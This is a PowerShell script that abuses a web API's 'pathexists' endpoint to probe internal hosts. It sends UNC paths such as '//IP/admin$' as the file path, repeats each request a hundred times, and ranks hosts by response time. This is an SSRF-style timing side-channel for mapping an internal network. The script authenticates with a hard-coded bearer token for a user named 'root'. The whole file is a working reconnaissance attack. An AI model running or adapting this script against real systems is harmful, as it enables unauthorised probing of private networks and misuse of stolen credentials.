param (
    [string]$Url         = "http://192.168.2.20/api/filesystem/pathexists",
    [string]$IPRange     = "192.168.2.54-55",
    [string]$BearerToken =  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJiNDg1YjU1My02YjE4LTRmNjUtOThjZC1iODhkNjU2ZTNlMzgiLCJ1c2VybmFtZSI6InJvb3QiLCJpYXQiOjE3MzEwODcxNTB9.NvPGcuoAEROSeCT1mE1NJG0XzP8H-BzGLfOzZ9GCX7M",
    [int]   $Iterations  = 100,
    [int]   $TimeoutSec  = 10
)

function Get-Median {
    param([double[]]$Values)
    $v = $Values | Sort-Object
    if ($v.Count -eq 0) { return 0 }
    if ($v.Count % 2 -eq 0) {
        return ($v[$v.Count/2 - 1] + $v[$v.Count/2]) / 2
    } else {
        return $v[([int]([math]::Floor(($v.Count - 1)/2)))]
    }
}

if ($IPRange -match '^(.+\.)((\d+)-(\d+))$') {
    $prefix     = $Matches[1]
    $startOctet = [int]$Matches[3]
    $endOctet   = [int]$Matches[4]
} else {
    Throw "IPRange must be in the form 'x.x.x.d1-d2'"
}

$headers = @{
    "Authorization" = "Bearer $BearerToken"
    "Content-Type"  = "application/json"
    "Accept"        = "application/json"
}

# disable Invoke-WebRequest progress
$oldProgress       = $ProgressPreference
$ProgressPreference = 'SilentlyContinue'

$results    = @()
$totalHosts = $endOctet - $startOctet + 1
$hostIndex  = 0

for ($hostIP = $startOctet; $hostIP -le $endOctet; $hostIP++) {
    $hostIndex++
    $probeIP   = "$prefix$hostIP"
    $durations = [System.Collections.Generic.List[double]]::new()
    $percent   = [int](($hostIndex / $totalHosts) * 100)
    
    # overwrite single-line status
    $status = "Probing $probeIP ($hostIndex/$totalHosts) — $percent% complete"
    Write-Host -NoNewline "`r$status"

    for ($i = 1; $i -le $Iterations; $i++) {
        $body = @{ filepath = "//$probeIP/admin$" } | ConvertTo-Json -Compress
        $t0   = [DateTime]::UtcNow
        try {
            Invoke-WebRequest -Uri $Url `
                              -Method POST `
                              -Body $body `
                              -Headers $headers `
                              -UseBasicParsing | Out-Null
        } catch { }
        $durations.Add((([DateTime]::UtcNow - $t0).TotalMilliseconds))
    }

    $results += [PSCustomObject]@{
        IP           = $probeIP
        AvgTimeMS    = [Math]::Round(($durations | Measure-Object -Average).Average, 2)
        MedianTimeMS = [Math]::Round((Get-Median -Values $durations), 2)
    }
}

# restore progress preference
$ProgressPreference = $oldProgress

# finish and newline
Write-Host "`nDone."

$results | Sort-Object MedianTimeMS -Descending | Format-Table -AutoSize
